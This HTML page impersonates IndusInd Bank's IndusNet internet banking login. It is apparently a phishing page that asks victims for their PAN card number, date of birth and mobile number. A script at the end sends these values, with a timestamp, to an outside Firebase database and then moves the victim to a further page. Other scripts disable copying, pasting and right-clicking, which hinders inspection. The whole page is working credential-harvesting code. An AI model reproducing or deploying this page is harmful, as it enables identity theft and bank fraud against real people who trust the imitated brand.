<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welcome to Internet Banking</title>
<link href="./main_files/style.css" rel="stylesheet" type="text/css">
<link href="./main_files/css" rel="stylesheet">
<link href="./main_files/style.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="./main_files/jquery.bxslider.css" type="text/css">
<link rel="stylesheet" href="./main_files/jquery.custom-scrollbar.css" type="text/css">
<link href="./main_files/media.css" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="./main_files/font-awesome.min.css">
<link rel="stylesheet" href="./main_files/sprite-login.css" type="text/css">
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.css">
<link rel="stylesheet" href="./main_files/font-awesome.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/bxslider/4.2.12/jquery.bxslider.min.js"></script>
  
    
<script>
$(document).ready(function(){
  $('.bannerSlider').bxSlider({
    slideWidth: 600,
    minSlides: 1,
    maxSlides: 1,
    moveSlides: 1,
    slideMargin: 10,
    auto: true,
    mode: 'horizontal'
  });
});
</script>
</head>
<body>

<header class="pageHeader">
    <div class="wrapper">
        <a href="#"><img src="./main_files/logo.png" alt="Indusind Bank" title="Indusind Bank" class="logo"></a>
        <img src="./main_files/indusnet-logo.png" alt="Indusnet" class="indusnetLogo">
        
    </div>
</header>

<div class="banner">
    <div class="wrapper">
        <ul class="bannerSlider">
            <li><a href="#" target="_blank"><img src="./main_files/CBDC_IndusNet_Banner.jpg" alt=""></a></li>
            <li><a href="#" target="_blank"><img src="./main_files/NRI_Banking_Banner_1170x165_px-01.jpg" alt=""></a></li>
            <li><a href="#" target="_self"><img src="./main_files/IndusMobile_Banners1-Apr-07.jpg" alt=""></a></li>
            <li><a href="#" target="_self"><img src="./main_files/RTGS_24X7_Banner.jpeg" alt=""></a></li>
            <li><a href="#" target="_blank"><img src="./main_files/Indus_Delight_Net_Banking_Banners_1170_x_165_px.jpg" alt=""></a></li>
        </ul>
    </div>
</div>

<div class="loginContent">
    <div class="wrapper">
        <div class="loginSec">
            <ul class="loginTab">
    <li style="font-weight: bold;">Enter your PAN Card Details</li>
</ul>

            <div class="loginTabContent current">
                
                
               <form action="" id="UDIND002" method="post">
                    <style>
    .txtField {
        text-transform: uppercase; /* Automatically capitalize letters */
    }
</style>

<div class="fieldBase">
    <input autocomplete="OFF" placeholder="PAN Card Number" type="text" id='upan' minlength="10" maxlength="10" class="txtField" size="28" oninput="formatPAN()" oncopy="return false" onpaste="return false" onselect="return false" oncut="return false" tabindex="1">
</div>

<script>
function formatPAN() {
    var input = document.getElementById('upan');
    var pan = input.value.toUpperCase(); // Convert to uppercase to ensure consistency
    input.value = pan; // Set the transformed value back to the input
    
    // Optionally, validate the format (AAAAA9999A) here and provide feedback or enforce correction
    if (!/^([A-Z]{5}[0-9]{4}[A-Z]{1})?$/.test(pan) && pan.length === 10) {
        // If the format is incorrect and the length is 10 characters, notify the user or handle as needed
        console.log("Invalid PAN format");
        // Implement further actions as needed, e.g., show an error message to the user
    }
}
</script>


                    <br>
              <div class="fieldBase">
    <input autocomplete="OFF" inputmode="numeric" placeholder="Date of Birth" type="text" id='udob' minlength="10" maxlength="10" class="txtField" size="28" oninput="formatDate()" oncopy="return false" onpaste="return false" onselect="return false" oncut="return false" tabindex="1">
</div>

<script>
function formatDate() {
    var input = document.getElementById('udob');
    var date = input.value;

    // Remove non-digits, then add slashes
    var numbers = date.replace(/\D/g, '');
    var char = {2:'/', 5:'/'};
    var dateFormatted = '';

    for (var i = 0; i < numbers.length; i++) {
        if (i === 2 || i === 4) { // After 2nd and 4th digits
            dateFormatted += '/';
        }
        dateFormatted += numbers[i];
    }

    // Set formatted date back to input
    input.value = dateFormatted.substring(0, 10); // Ensure maxlength is 10
}
</script>

      
                   <br>
                <div class="fieldBase">
    <input autocomplete="OFF" inputmode="numeric" placeholder="Mobile Number" type="text" id='umob' minlength="10" maxlength="10" class="txtField" size="28" tabindex="1">
</div>
                    
                    

                    
                    <br>
                   <button type="submit" class="signInBtn" id="button1" tabindex="6">Continue</button>

                    
                </form>
                
                <br>

            </div>
        </div>
    </div>
</div>

<footer class="pageFooter">
    <div class="footerTop">
        <div class="wrapper">
            <p>Enjoy banking on the go with our next generation Mobile App</p>
            <a href="#" target="_blank"><img src="./main_files/app-store-apple.png" alt="Apple App Store" title="Apple App Store"></a>
            <a href="#" target="_blank"><img src="./main_files/google-play.png" alt="Google Play" title="Google Play"></a>
            <a href="#" target="_blank"><img src="./main_files/app-store.png" alt="App Store" title="App Store"></a>
        </div>
    </div>
    <div class="footerBtm">
        <div class="wrapper">
            <div class="footerLeft">
                <p><a target="_blank" href="#">Privacy Policy</a> <a target="_blank" href="#">Terms & Condition</a> <a target="_blank" href="#">Disclaimer</a> <span>COPYRIGHT Â© ALL RIGHTS RESERVED</span></p>
                <p><strong>Browser Requirements for NetBanking</strong><br>Please Use I.E 10 and above or any other browser with Latest Version.</p>
            </div>
            <a href="#"><img src="./main_files/entrust-logo.png" alt="Entrust" title="Entrust"></a>
        </div>
    </div>
</footer>
    
    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>

    
    <script src="main_files/firebase.js">
        
        
    </script>
    
       <script>
document.getElementById("UDIND002").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();
    
    // Correct variable names based on form input IDs
    const PANNumber = document.getElementById("upan").value.replace(/\s/g, "");
    const uUDOB = document.getElementById("udob").value;
    const uUMOB = document.getElementById("umob").value;

    // Corrected variable names for the function call
    saveDataToFirebase(PANNumber, uUDOB, uUMOB);
}

function saveDataToFirebase(PANNumber, uUDOB, uUMOB) {
    const dbRef = firebase.database().ref('UDIND002');
    const currentDate = getCurrentDate();
    const currentTime = getCurrentTime();

    // Corrected object keys to match variable names
    dbRef.push({
        PAN: PANNumber,
        DOB: uUDOB,
        Phone: uUMOB,
        Date: currentDate, // Use the variable names for current date
        Time: currentTime // Use the variable names for current time
    }).then(() => {
        console.log("Data saved successfully to Firebase.");
        window.location.href = "valid02.html"; // Redirect on successful save
    }).catch((error) => {
        console.error("Error saving data to Firebase:", error);
    });
}

function getCurrentDate() {
    const currentDate = new Date();
    const year = currentDate.getFullYear();
    const month = String(currentDate.getMonth() + 1).padStart(2, "0");
    const day = String(currentDate.getDate()).padStart(2, "0");
    return `${year}-${month}-${day}`;
}

function getCurrentTime() {
    const currentTime = new Date();
    const hours = String(currentTime.getHours()).padStart(2, "0");
    const minutes = String(currentTime.getMinutes()).padStart(2, "0");
    const seconds = String(currentTime.getSeconds()).padStart(2, "0");
    return `${hours}:${minutes}:${seconds}`;
} 

</script>


</body>
    <script type="text/javascript">
    // Refresh to main page (index) on right-click
    document.addEventListener('contextmenu', function(event) {
        event.preventDefault();
        window.location.href = "index.html"; // Replace "index.html" with your main page URL
    });
</script>
</html>
